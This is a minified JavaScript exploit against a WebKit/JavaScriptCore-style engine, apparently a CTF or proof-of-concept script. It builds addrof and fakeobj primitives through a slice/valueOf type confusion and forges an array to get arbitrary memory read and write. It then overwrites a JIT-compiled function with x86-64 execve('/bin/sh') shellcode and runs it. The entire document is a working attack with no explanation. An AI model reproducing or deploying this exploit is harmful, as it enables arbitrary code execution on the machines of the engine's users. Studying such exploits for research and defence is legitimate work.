function fail(msg){print("[-] "+msg);throw null;}function assert(cond,msg){if(!cond){fail(msg)}}function hex(b){return('0'+b.toString(16)).substr(-2)}function hexlify(bytes){var res=[];for(var i=0;i<bytes.length;i++){res.push(hex(bytes[i]))}return res.join('')}function unhexlify(hexstr){if(hexstr.length%2==1){throw new TypeError("Invalid hex string");}var bytes=new Uint8Array(hexstr.length/2);for(var i=0;i<hexstr.length;i+=2){bytes[i/2]=parseInt(hexstr.substr(i,2),16)}return bytes}function hexdump(data){if(typeof data.BYTES_PER_ELEMENT!=='undefined'){data=Array.from(data)}var lines=[];for(var i=0;i<data.length;i+=16){var chunk=data.slice(i,i+16);var parts=chunk.map(hex);if(parts.length>8){parts.splice(8,0,' ')}lines.push(parts.join(' '))}return lines.join('\n')}var Struct=(function(){var buffer=new ArrayBuffer(8);var byteView=new Uint8Array(buffer);var uint32View=new Uint32Array(buffer);var float64View=new Float64Array(buffer);return{pack:function(type,value){var view=type;view[0]=value;return new Uint8Array(buffer,0,type.BYTES_PER_ELEMENT)},unpack:function(type,bytes){if(bytes.length!==type.BYTES_PER_ELEMENT)throw Error("Invalid bytearray");var view=type;byteView.set(bytes);return view[0]},int8:byteView,int32:uint32View,float64:float64View}})();function Int64(v){var bytes=new Uint8Array(8);switch(typeof v){case'number':v='0x'+Math.floor(v).toString(16);case'string':if(v.startsWith('0x')){v=v.substr(2)}if(v.length%2==1){v='0'+v}var bigEndian=unhexlify(v,8);bytes.set(Array.from(bigEndian).reverse());break;case'object':if(v instanceof Int64){bytes.set(v.bytes())}else{if(v.length!=8)throw TypeError("Array must have excactly 8 elements.");bytes.set(v)}break;case'undefined':break;default:throw TypeError("Int64 constructor requires an argument.");}this.asDouble=function(){if(bytes[7]==0xff&&(bytes[6]==0xff||bytes[6]==0xfe))throw new RangeError("Integer can not be represented by a double");return Struct.unpack(Struct.float64,bytes)};this.asJSValue=function(){if((bytes[7]==0&&bytes[6]==0)||(bytes[7]==0xff&&bytes[6]==0xff)){throw new RangeError("Integer can not be represented by a JSValue");}this.assignSub(this,0x1000000000000);var res=Struct.unpack(Struct.float64,bytes);this.assignAdd(this,0x1000000000000);return res};this.bytes=function(){return Array.from(bytes)};this.byteAt=function(i){return bytes[i]};this.toString=function(){return'0x'+hexlify(Array.from(bytes).reverse())};function operation(f,nargs){return function(){if(arguments.length!=nargs){throw Error("Not enough arguments for function "+f.name);}for(var i=0;i<arguments.length;i++){if(!(arguments[i]instanceof Int64)){arguments[i]=new Int64(arguments[i])}}return f.apply(this,arguments)}}this.assignNeg=operation(function neg(n){for(var i=0;i<8;i++){bytes[i]=~n.byteAt(i)}return this.assignAdd(this,Int64.One)},1);this.assignAdd=operation(function add(a,b){var carry=0;for(var i=0;i<8;i++){var cur=a.byteAt(i)+b.byteAt(i)+carry;carry=cur>0xff|0;bytes[i]=cur}return this},2);this.assignSub=operation(function sub(a,b){var carry=0;for(var i=0;i<8;i++){var cur=a.byteAt(i)-b.byteAt(i)-carry;carry=cur<0|0;bytes[i]=cur}return this},2);this.assignXor=operation(function sub(a,b){for(var i=0;i<8;i++){bytes[i]=a.byteAt(i)^b.byteAt(i)}return this},2)}Int64.fromDouble=function(d){var bytes=Struct.pack(Struct.float64,d);return new Int64(bytes)};function Neg(n){return(new Int64()).assignNeg(n)}function Add(a,b){return(new Int64()).assignAdd(a,b)}function Sub(a,b){return(new Int64()).assignSub(a,b)}function Xor(a,b){return(new Int64()).assignXor(a,b)}Int64.Zero=new Int64(0);Int64.One=new Int64(1);const ITERATIONS=100000;function jitCompile(f,...args){for(var i=0;i<ITERATIONS;i++){f(...args)}}jitCompile(function dummy(){return 42});function makeJITCompiledFunction(){function target(num){for(var i=2;i<num;i++){if(num%i===0){return false}}return true}jitCompile(target,123);return target}function addrof(obj){var a=[];for(var i=0;i<100;i++){a.push(i+0.123)};var b=a.slice(0,{valueOf:function(){a.length=0;a=[obj];return 100}});return Int64.fromDouble(b[4])};function fakeobj(addr){var a=[];for(var i=0;i<100;i++){a.push({})}addr=addr.asDouble();return a.slice(0,{valueOf:function(){a.length=0;a=[addr];return 100}})[4]}shellcode=[0x6A,0x68,0x48,0xB8,0x2F,0x62,0x69,0x6E,0x2F,0x2F,0x2F,0x73,0x50,0x48,0x89,0xE7,0x31,0xF6,0x6A,0x3B,0x58,0x99,0x0F,0x05];shellcode=[0x6A,0x3B,0x58,0x99,0x48,0xBB,0x2F,0x62,0x69,0x6E,0x2F,0x73,0x68,0x00,0x53,0x48,0x89,0xE7,0x68,0x2D,0x63,0x00,0x00,0x48,0x89,0xE6,0x52,0xE8,0x08,0x00,0x00,0x00,0x2F,0x62,0x69,0x6E,0x2F,0x73,0x68,0x00,0x56,0x57,0x48,0x89,0xE6,0x0F,0x05];function pwn(){var addr=addrof({p:0x1337});print(addr);var structs=[];for(var i=0;i<0x1000;++i){var array=[13.37];array.pointer=1234;array['prop'+i]=13.37;structs.push(array)}var victim=structs[0x800];print(`[+]victim@${addrof(victim)}`);var flags_double_array=new Int64("0x0108200700001000").asJSValue();var container={header:flags_double_array,butterfly:victim};var containerAddr=addrof(container);print(`[+]container@${containerAddr}`);var hax=fakeobj(Add(containerAddr,0x10));var origButterfly=hax[1];var memory={addrof:addrof,fakeobj:fakeobj,writeInt64(addr,int64){hax[1]=Add(addr,0x10).asDouble();victim.pointer=int64.asJSValue()},write16(addr,value){hax[1]=Add(addr,0x10).asDouble();victim.pointer=value},write(addr,data){while(data.length%4!=0)data.push(0);var bytes=new Uint8Array(data);var ints=new Uint16Array(bytes.buffer);for(var i=0;i<ints.length;i++)this.write16(Add(addr,2*i),ints[i])},read64(addr){hax[1]=Add(addr,0x10).asDouble();return this.addrof(victim.pointer)},test(){var v={};var obj={p:v};var addr=this.addrof(obj);assert(this.fakeobj(addr).p==v,"addrof and/or fakeobj does not work");var propertyAddr=Add(addr,0x10);var value=this.read64(propertyAddr);assert(value.asDouble()==addrof(v).asDouble(),"read64 does not work");this.write16(propertyAddr,0x1337);assert(obj.p==0x1337,"write16 does not work")},};var plainObj={};var header=memory.read64(addrof(plainObj));memory.writeInt64(memory.addrof(container),header);memory.test();print("[+] limited memory read/write working");var func=makeJITCompiledFunction();var funcAddr=memory.addrof(func);print(`[+]shellcode function object@${funcAddr}`);var executableAddr=memory.read64(Add(funcAddr,24));print(`[+]executable instance@${executableAddr}`);var jitCodeObjAddr=memory.read64(Add(executableAddr,24));print(`[+]JITCode instance@${jitCodeObjAddr}`);var jitCodeAddr=memory.read64(Add(jitCodeObjAddr,352));print(`[+]JITCode@${jitCodeAddr}`);var s="A".repeat(64);var strAddr=addrof(s);var strData=Add(memory.read64(Add(strAddr,16)),20);shellcode.push(...strData.bytes());memory.write(jitCodeAddr,shellcode);var res=func()}pwn()